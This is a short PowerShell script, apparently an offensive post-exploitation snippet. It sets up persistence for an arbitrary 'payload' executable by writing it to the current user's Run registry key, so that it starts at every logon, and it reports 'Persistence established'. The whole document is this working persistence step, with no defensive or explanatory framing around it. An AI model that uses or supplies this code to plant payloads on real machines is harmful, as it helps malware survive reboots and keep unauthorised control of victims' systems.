# Set the full path to your payload (for example, a custom executable or script)
$payloadPath = "C:\Path\To\Your\Payload.exe"

# Define the registry key path for persistence under the current user context.
$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Choose a name for the registry entry (this can be any identifier you prefer)
$entryName = "MyPersistenceTool"

# Create or update the registry value to point to your payload.
New-ItemProperty -Path $regKeyPath -Name $entryName -Value $payloadPath -PropertyType String -Force

Write-Output "Persistence established: $entryName will run $payloadPath at user logon."
